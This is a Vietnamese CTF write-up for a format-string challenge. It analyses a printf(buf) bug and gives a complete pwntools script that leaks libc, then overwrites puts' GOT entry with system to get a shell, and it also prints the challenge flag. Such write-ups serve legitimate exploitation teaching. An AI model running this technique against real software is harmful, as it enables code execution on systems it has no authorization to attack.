# [CTF] - [format-string-3]

> **Meta Info**
> - **Author:** Hoan (KMA)
> - **Difficulty:** Easy
> - **Flag:** `academy{G07_G07?_76eae555}`

---

## PHẦN 1: PHÂN TÍCH BÀI (Challenge Analysis)

### 1. Thông tin chung & Checksec
- **File nhận được:** `format-string-3`, `format-string-3.c` ,` ld-linux-x86-64.so.2` , `libc.so.6`
- **Kết quả checksec:**
  ```bash
  [*] '/home/nguyenngochoan/picoctf/valley'
      Arch:     amd64-64-little
      RELRO:    Partial RELRO
      Stack:    Canary found
      NX:       NX enabled
      PIE:      N0 PIE


### 2. Phân tích tĩnh :
```
void hello() {
	puts("Howdy gamers!");
	printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &setvbuf);
}
``` 
- Khi vô `Main()` đầu tiên nó sẽ cho ta địa chỉ của libc -> tính được libc_base 
- Sau đó chương trình sẽ gọi `fgets` để nhập dữ liệu vô :
```

	fgets(buf, 1024, stdin);	
	printf(buf);    <-- lỗi fmtstr 

	puts(normal_string);
```
- Ta có thể thấy rõ lỗi ở đó , sau đó gọi `puts` với tham số đầu là `normal_string` trong biến đó là chuỗi `/bin/sh` 

## PHẦN 2: HƯỚNG VÀ CÁCH GIẢI :
---
### 1. Ý tưởng : 
- Ý đồ của tác giả chắc chắn là muốn chúng ta tấn công `GOT` thay đổi giá trị bên trong của `puts` khiến nó trỏ đến 1 lệnh khác đó chính là `system` trong libc mà chương trình đã cho ta địa chỉ của libc bất kì rồi -> `libc_base` -> `system = libc_base + offset ` 
- Sau đó dùng công cụ `fmtstr_payload` để có thể ghi đè được `GOT` một cách dễ dàng từ đó chiếm được `shell`
- Cách tìm `offset` để lắp vô `fmtstr_payload` là nhập `AAA` rồi một đống `%p` , ngồi đếm xem in dãy lần bao nhiêu ra `0x44` thì đó là `offset` 

### 2. Kịch bản tấn công :
```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./format-string-3_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = process(exe.path)
#p = remote('xebec.cylabacademy.net',43102)
gdb.attach(p,gdbscript = '''
            b*main+123
            c
''') 



p.recvuntil(b'libc: ')
libc_leak = int(p.recvline().strip(),16)
libc.address = libc_leak - 0x7a3f0
log.info(f'libc_leak = {hex(libc_leak)}')
log.info(f'libc_adr = {hex(libc.address)}')

puts = exe.got['puts']
sys = libc.sym['system']
log.info(f'puts_got = {hex(puts)}')
log.info(f'sym = {hex(sys)}')

payload = fmtstr_payload(38,{puts:sys},write_size ='short')
p.sendline(payload)

p.interactive()
```